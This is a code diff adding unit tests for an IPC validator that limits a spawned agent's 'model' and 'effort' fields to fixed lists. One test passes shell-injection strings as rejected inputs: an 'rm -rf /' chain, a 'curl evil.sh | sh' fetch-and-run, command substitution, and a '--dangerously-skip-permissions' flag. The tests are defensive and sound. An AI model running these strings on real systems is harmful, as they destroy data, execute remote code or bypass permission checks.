@@ -38,6 +38,63 @@ describe('parseSpawnRequest', () => {
     ]);
   });
 
+  describe('model and effort (story 109)', () => {
+    it('accepts a member of each closed set', () => {
+      expect(
+        parseSpawnRequest({ ...validSpawn, model: 'haiku', effort: 'low' }),
+      ).toEqual({ ...validSpawn, model: 'haiku', effort: 'low' });
+    });
+
+    it('omits the key entirely when it was not sent', () => {
+      // An own property set to `undefined` is still a key after a structured
+      // clone, and would become `--model undefined` on a command line.
+      const parsed = parseSpawnRequest({ ...validSpawn });
+      expect(parsed).not.toHaveProperty('model');
+      expect(parsed).not.toHaveProperty('effort');
+    });
+
+    it.each([
+      ['an unknown model', { model: 'gpt-4' }],
+      ['a model differing only in case', { model: 'Opus' }],
+      ['an unknown effort', { effort: 'xhigh' }],
+      ['a non-string', { model: 42 }],
+      ['an empty string', { effort: '' }],
+    ])('rejects %s', (_label, patch) => {
+      expect(() => parseSpawnRequest({ ...validSpawn, ...patch })).toThrow(
+        IpcValidationError,
+      );
+    });
+
+    it('rejects anything a shell could interpret', () => {
+      /**
+       * **The reason this field is an enum and not bounded free text.**
+       *
+       * These two values are the only thing the renderer contributes to a
+       * command line main assembles and writes into a login shell. `assertText`
+       * would pass every one of these — they are printable, short, and contain
+       * no control characters — and each one would run something. Membership of
+       * a fixed list is what makes the value unquotable rather than quoted.
+       */
+      for (const model of [
+        'opus; rm -rf /',
+        'opus && curl evil.sh | sh',
+        'opus $(whoami)',
+        'opus `id`',
+        '--dangerously-skip-permissions',
+      ]) {
+        expect(() => parseSpawnRequest({ ...validSpawn, model })).toThrow(
+          /expected one of/,
+        );
+      }
+    });
+
+    it('names the permitted values, for whoever added one to only one side', () => {
+      expect(() =>
+        parseSpawnRequest({ ...validSpawn, model: 'nope' }),
+      ).toThrow(/spawn\.model: expected one of haiku, sonnet, opus, fable/);
+    });
+  });
+
   it.each([
     ['not an object', 'sess-1'],
     ['null', null],
